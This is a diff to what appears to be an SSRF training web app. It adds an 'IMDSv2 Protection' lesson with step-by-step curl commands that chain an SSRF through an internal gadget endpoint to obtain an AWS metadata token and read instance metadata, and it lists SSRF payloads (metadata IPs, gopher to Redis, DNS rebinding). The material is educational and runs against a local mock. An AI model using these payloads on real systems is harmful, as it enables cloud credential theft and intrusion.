@@ -57,7 +57,7 @@
                     <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense2">🛡️ Defense: Library Filter</button>
                     <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense3">🛡️ Defense: DNS Resolution</button>
                     <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense4">🛡️ Defense: Disabling Redirection</button>
-                    <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense5">🛡️ Defense: Comprehensive Controls</button>
+                    <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense6">🛡️ Defense: IMDSv2 Protection</button>
                 </nav>
             </aside>
 
@@ -264,26 +264,83 @@
                         "http://7f000001.01020304.rbndr.us:3000/ssh_key"
                     ]
                 },
-                defense5: {
-                    title: "Defense 5: Comprehensive Defense vs. Protocol Smuggling",
-                    description: "A comprehensive solution that combines multiple techniques: strict input validation, DNS resolution caching, network-level controls, and request monitoring to prevent SSRF attacks effectively.",
-                    code: "// Comprehensive SSRF protection\nconst url = req.query.url;\nconst hostname = getHostname(url);\n\n// 1. Protocol validation\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format');\n}\n\n// 2. Strict hostname validation\nif (!isValidPublicDomain(hostname)) {\n    return res.status(423).send('Only public domains allowed');\n}\n\n// 3. DNS resolution with caching and validation\nconst resolvedIP = await secureResolve(hostname);\nif (isPrivateIP(resolvedIP)) {\n    return res.status(423).send('Private IP access denied');\n}\n\n// 4. Network-level restrictions\nconst response = await secureRequest(url, {\n    maxRedirects: 0,\n    timeout: 5000,\n    allowedPorts: [80, 443],\n    networkPolicy: 'public-only'\n});\n\nreturn res.send(response.data);",
-                    vulnerability: "This defense implements multiple layers of protection, but may still be vulnerable to sophisticated attacks involving zero-day bypasses, protocol smuggling, or advanced DNS manipulation techniques.",
-                    bypassTitle: "Advanced Attack Vectors",
-                    defenseTechnique: "Multi-Layer Protection",
-                    attackTechnique: "Protocol Smuggling",
-                    advancedTechniques: [
-                        "Protocol smuggling and HTTP request splitting",
-                        "IPv6 bypass techniques and dual-stack exploitation", 
-                        "Cloud metadata service enumeration",
-                        "Internal service discovery via timing attacks",
-                        "WebSocket upgrade attacks and protocol switching"
+                defense6: {
+                    title: "Defense 6: IMDSv2 Protection vs. SSRF Chaining",
+                    description: `When developers realized attackers were abusing direct SSRF to fetch cloud metadata, they enforced IMDSv2, which requires a temporary token fetched via a PUT request with custom headers, a move that blocked naive SSRF payloads. </br></br> But attackers didn’t stop there. When direct requests failed, they chained the SSRF through internal services (like Jenkins or Atlassian Gadgets) that could make outbound requests with custom headers, bypassing the protection entirely.`,
+                    code: `// Block direct metadata access
+                const metadataIPs = ['169.254.169.254', '100.100.100.200'];
+                if (metadataIPs.includes(hostname)) {
+                    return res.status(423).send('Direct metadata access blocked');
+                }
+
+                // Strip IMDSv2 headers from requests
+                const response = await axios.get(url, {
+                    headers: {
+                        'X-aws-ec2-metadata-token': undefined
+                    }
+                });`,
+                    vulnerability: "IMDSv2 is effective against direct SSRF, but fails when attackers find internal services (Atlassian Gadgets, Jenkins Script Console, internal APIs) that can make HTTP requests with arbitrary headers. The attacker uses SSRF to make the internal service perform the IMDSv2 token exchange.",
+                    bypassTitle: "Bypass: SSRF Chaining via Internal Service",
+                    defenseTechnique: "IMDSv2 Token Requirement",
+                    attackTechnique: "SSRF Chaining Attack",
+                    bypassSteps: [
+                        "Direct metadata access fails due to IMDSv2 (returns 401 Unauthorized)",
+                        "Find an internal service endpoint that proxies HTTP requests (like /internal/gadgets/makeRequest)",
+                        "Use SSRF to make this service obtain an IMDSv2 token",
+                        "Use SSRF again to make this service access metadata with the token",
+                        "Since the internal service is trusted and can set headers, it bypasses all protections"
                     ],
+                    curlCommands: {
+                        title: "Test IMDSv2 Bypass with These Commands:",
+                        commands: [
+                            {
+                                title: "🔧 Setup: First, restart the Docker container to restrict the metadata service to only support IMDSv2",
+                                command: "docker run -it --rm -p 1338:1338 public.ecr.aws/aws-ec2/amazon-ec2-metadata-mock:v1.13.0 --imdsv2",
+                                expectedResult: "Flags:imdsv2: true"
+                            },
+                            {
+                                title: "1️⃣ First, try direct access (this will fail):",
+                                command: "curl http://169.254.169.254/latest/meta-data/",
+                                expectedResult: "401 Unauthorized - ❌ Action Blocked! Direct metadata access is forbidden"
+                            },
+                            {
+                                title: "2️⃣ Now the SSRF chain attack - Step 1: Get IMDSv2 token via gadget service:",
+                                command: 'curl -X POST http://localhost:3000/internal/gadgets/makeRequest -H "Content-Type: application/x-www-form-urlencoded" -d "url=http://169.254.169.254/latest/api/token&httpMethod=PUT&headers=X-aws-ec2-metadata-token-ttl-seconds%3D21600"',
+                                expectedResult: "Stores token in data:<TOKEN> variable from the response"
+                            },
+                            {
+                                title: "3️⃣ Step 3: Use token to access metadata via internal service (make sure to URL encode Token twice before using it):",
+                                command: `curl -X POST http://localhost:3000/internal/gadgets/makeRequest -H "Content-Type: application/x-www-form-urlencoded" -d "url=http://169.254.169.254/latest/meta-data/&httpMethod=GET&headers=X-aws-ec2-metadata-token%3D{TOKEN-URL-ENCODED-TWICE}"`,
+                                expectedResult: "Returns metadata - bypass successful! 🎯"
+                            },
+                            {
+                                title: "🔧 Cleanup: Switch back to v1+v2 mode by restarting docker container without flags",
+                                command: `docker run -it --rm -p 1338:1338 public.ecr.aws/aws-ec2/amazon-ec2-metadata-mock:v1.13.0`,
+                                expectedResult: "Metadata service restored to default mode, which is supporting v1"
+                            }
+                        ]
+                    },
+                    keyInsight: {
+                        title: "🔑 Key Insight:",
+                        content: "The SSRF protection in defense6 (GET endpoint) successfully blocks direct metadata access. However, the internal gadget service (POST endpoint) is not protected by the same SSRF defenses. This demonstrates how internal services become attack vectors when they can make arbitrary HTTP requests."
+                    },
+                    additionalResources: {
+                        title: "Learn More:",
+                        links: [
+                            {
+                                text: "Original Research by Yassine Aboukir",
+                                url: "https://www.yassineaboukir.com/blog/exploitation-of-an-SSRF-vulnerability-against-EC2-IMDSv2/",
+                                description: "Detailed writeup of IMDSv2 bypass via Atlassian Gadgets"
+                            },
+                            {
+                                text: "AWS IMDSv2 Documentation",
+                                url: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
+                                description: "Official AWS guide on IMDSv2 implementation"
+                            }
+                        ]
+                    },
                     payloads: [
-                        "http://[::1]:3000/ssh_key",
-                        "http://metadata.google.internal/",
-                        "http://169.254.170.2/v2/metadata/",
-                        "gopher://127.0.0.1:6379/_INFO"
+                        "http://localhost:3000/internal/gadgets/makeRequest"
                     ]
                 }
             };
@@ -534,6 +591,27 @@
                     html += '</div></div>';
                 }
 
+                // Add curl commands section if it exists
+                if (details.curlCommands) {
+                    html += '<div class="mt-6 p-4 bg-gray-900 rounded-lg border border-gray-700">' +
+                        '<h3 class="font-semibold mb-4 text-yellow-300 text-lg">' + details.curlCommands.title + '</h3>';
+                    
+                    details.curlCommands.commands.forEach(function(cmd, index) {
+                        html += '<div class="mb-6">' +
+                            '<h4 class="text-blue-300 font-medium mb-2">' + cmd.title + '</h4>' +
+                            '<div class="bg-black rounded p-3 mb-2">' +
+                            '<pre class="text-green-400 text-sm font-mono whitespace-pre-wrap">' + cmd.command + '</pre>' +
+                            '</div>' +
+                            '<div class="text-gray-400 text-sm italic">Expected: ' + cmd.expectedResult + '</div>' +
+                            '</div>';
+                    });
+                    
+                    html += '<div class="mt-4 p-3 bg-yellow-900/20 border border-yellow-700/50 rounded">' +
+                        '<p class="text-yellow-300 text-sm">' +
+                        '<strong>💡 Pro Tip:</strong> Copy these commands to your terminal. The SSRF chain shows how internal services ' +
+                        'become attack vectors when they can make HTTP requests with custom headers.' +
+                        '</p></div></div>';
+                }
 
                 // Payloads section
                 html += '<div class="border border-slate-500 rounded-lg bg-slate-800/50">' +
